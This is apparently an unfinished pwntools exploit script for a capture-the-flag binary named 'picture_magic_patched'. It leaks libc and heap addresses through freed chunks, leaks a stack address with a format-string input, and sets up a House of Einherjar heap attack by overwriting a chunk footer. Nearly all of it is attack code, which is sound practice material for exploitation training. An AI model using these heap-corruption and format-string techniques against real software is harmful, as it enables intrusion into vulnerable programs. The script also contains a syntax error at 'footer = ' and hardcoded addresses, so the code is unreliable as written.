#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./picture_magic_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.36.so")

context.binary = exe
# context.log_level = 'debug'

r = process('./picture_magic_patched')

def gee():
    gdb.attach(r, gdbscript='''
b sell_picture
b create_picture
''')
    time.sleep(2)


def create(w, h, p, leak=False): 
    r.sendlineafter("> ", "1")
    r.sendlineafter("Width: ", w)
    r.sendlineafter("Height: ", h)
    if leak == False:
        r.sendlineafter("=", p)
    else:
        r.recvline()
        ret = r.recvline()
        return ret
                    
def sell(idx, price, leak=False):
    # there is something kind of like a race because when we receive the leak, we receive all the data so there is nothing more to receive
    # so need to search for something on that stack that is usable
    # print(idx, price, leak)
    if leak == True:
        r.sendline(b"4")
        print('o')
    else:
        r.sendlineafter("> ", b"4")
    print(idx, leak)
    r.sendlineafter(": ", str(idx).encode()) # need to use encode or else it hangs for some reason??? doesnt seem like it's even related to encode actually 
    if leak == False:
        r.sendlineafter("? ", price)
    else:
        r.sendafter("for? ", price) # price 
        print("sent!")
        l = r.recvline()
        print(l)
        l = r.recvline()
        print(l)
        r.sendlineafter("? ", "y")
        return l

def transform(idx, option, sz, tr, tc):
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", str(idx))
    r.sendlineafter(": ", option)
    r.sendlineafter(": ", str(sz))
    r.sendlineafter(": ", str(tr))
    r.sendlineafter(": ", str(tc))

def new_name(p):
    r.sendlineafter("> ", "5")
    r.sendlineafter(": ", p)

def main():
    r.sendlineafter(": ", "a")
    h1 = str(1)
    w1 = str(1)
    p1 = "C" * 1
    create(h1, w1, p1)
    create(h1, w1, p1)
    create(h1, w1, p1)
    create(h1, w1, p1)

    gee()

    sell(0, "0")
    sell(2, "0")
    sell(3, "0")
    print("Leaking libc")

    l = create('.', '.', p1, True) # get our leak into the main arena after dereferencing the allocated chunk of memory
    leak = l.decode().split("(")[1].split(")")[0].split(',')
    upper = int(leak[1].strip()).to_bytes(2, byteorder='big')
    lower = int(leak[0].strip()).to_bytes(4, byteorder='big')
    libc_leak = upper + lower
    print(f"libc leak: {libc_leak.hex()}")

    create(h1, w1, p1) # allocate again because an alloc failure does a free afterwards for cleanup in the code in the source binary

    l = create('.', '.', p1, True)
    leak = l.decode().split("(")[1].split(")")[0].split(',')
    upper = int(leak[1].strip()).to_bytes(2, byteorder='big')
    lower = int(leak[0].strip()).to_bytes(4, byteorder='big')
    heap_leak = upper + lower
    print(f"heap leak: {heap_leak.hex()}")

    # %p and %lx both work but i think i can use %p to print off more stuff from the stack like a heap address 
    sbuf_addr = 0x7ffcd8e91bf0
    stack_leak = 0x7ffcd8e8fa90
    s_offset = sbuf_addr - stack_leak
    print(f"Stack offset: {s_offset}")

    stack_leak = sell(1, b"%lx\n", True).decode().split("$")[1].split(".")[0].strip()
    print(f"stack leak: {stack_leak}")
    stack_leak = int(stack_leak, 16) + s_offset
    stack_leak = stack_leak.to_bytes(8, byteorder='big')
    print(f"stack leak with offset: {stack_leak.hex()}")
    payload = 'b'
    new_name(payload)
    sell(1,"0")
    sell(0,"0")

    heap_to_stack_offset = 0x7ffc393dc7e0 - 0x55bae5bbc290
    footer = 
    # Grabbing all the leaks done 
    #
    # We can now do the house of einherjar attack 
    create(str(1), str(1), "A") 
    create(str(1), str(1), "B")
    sell(1, "0")
    # gee()
    stack_leak = stack_leak[2:][::-1]
    assert len(stack_leak) == 6
    print(stack_leak)
    create(str(6), str(1), b'\x01' * 5 + b'\n')
    # gee()
    for i, v in enumerate(stack_leak):
        if i == len(stack_leak) - 1: break
        print(hex(v), i)
        transform(1, 'a', v-1, 0, i)
    transform(1, 'a', 0x7f-0xa, 0, 5) # this last one might not work 
    sell(0, "0")
    create(str(16), str(79), b'A' * 16*78 + b'B' * 16)

    # modify the footer to calculate the size of the offset, which should take us back to the stack pointer

    sell(1, "0")
    

    ##### Messing around
    # h1 = str(10)
    # w1 = str(10)
    # payload = b'B' * 100
    # create(h1, w1, payload) # create first chunk since it's a stack 
    # create(h1, w1, payload) # create second that we want to overwrite
    # sell(0, "0") # free first chunk for reallocation
    # mh = 79
    # mw = 16
    #
    # create(str(mw), str(mh), b'A'*mh*mw) # allocate with first chunk to overflow second
    # create(str(6), str(1), b'C' * 6) # create a third chunk
    # create(str(6), str(1), b'D' * 6)
    #
    # sell(2, "0") # causes coalesce with previous chunk but we're erroring on an issue
    # create(str(2), str(1), b'AA')
    #
    r.interactive()
    
if __name__ == "__main__":
    main()




